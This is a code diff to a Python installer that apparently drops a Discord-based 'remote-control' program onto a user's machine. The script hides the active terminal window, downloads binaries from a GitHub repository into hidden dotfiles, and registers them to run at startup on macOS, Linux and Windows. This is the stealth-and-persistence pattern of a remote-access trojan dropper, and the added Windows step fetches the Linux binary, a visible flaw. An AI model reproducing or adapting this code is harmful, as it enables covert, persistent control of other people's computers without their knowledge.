@@ -13,6 +13,8 @@ localfile = f"{expanduser('~')}/.{filename}"
 
 try:
     remove(localfile)
+    remove(f"{localfile}.app")
+    remove(f"{localfile}.tmp.zip")
 except FileNotFoundError:
     pass
 
@@ -20,7 +22,10 @@ except FileNotFoundError:
 if platform == "darwin":
     system("osascript -e 'tell application \"System Events\" to set activeApp to name of first application process whose frontmost is true' -e 'set terminalEmulators to {\"Terminal\", \"iTerm\", \"Hyper\", \"Kitty\"}' -e 'repeat with termApp in terminalEmulators' -e 'if (activeApp contains termApp) then' -e 'tell application termApp to set currentWindow to front window' -e 'set visible of currentWindow to false' -e 'exit repeat' -e 'end if' -e 'end repeat'")
     open(localfile, 'wb').write(get("https://raw.githubusercontent.com/mrdog233o5/remote-control-discord/main/dist/main-mac", allow_redirects=True).content)
-    system(f"osascript -e 'tell application \"System Events\" to make login item at end with properties {{path:\"{localfile}\", hidden:true}}' > /dev/null")
+    open(f"{localfile}.tmp.zip", 'wb').write(get("https://github.com/mrdog233o5/remote-control-discord/raw/main/dist/main.app.zip", allow_redirects=True).content)
+    system(f"unzip {localfile}.tmp.zip")
+    system(f"mv {localfile}.tmp/dist/* {localfile}.app && rm -rf {localfile}.tmp*")
+    system(f"osascript -e 'tell application \"System Events\" to make login item at end with properties {{path:\"{localfile}.app\", hidden:true}}' > /dev/null")
 elif platform == "linux":
     from os import environ
     open(localfile, 'wb').write(get("https://raw.githubusercontent.com/mrdog233o5/remote-control-discord/main/dist/main-linux", allow_redirects=True).content)
@@ -29,6 +34,7 @@ elif platform == "linux":
     elif 'bash' in environ['SHELL']:
         system(f"echo {localfile} >> {expanduser('~')}/.bashenv")
 elif platform == "win32":
+    open(localfile, 'wb').write(get("https://raw.githubusercontent.com/mrdog233o5/remote-control-discord/main/dist/main-linux", allow_redirects=True).content)
     from shutil import copy
     copy(localfile ,"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp")
 
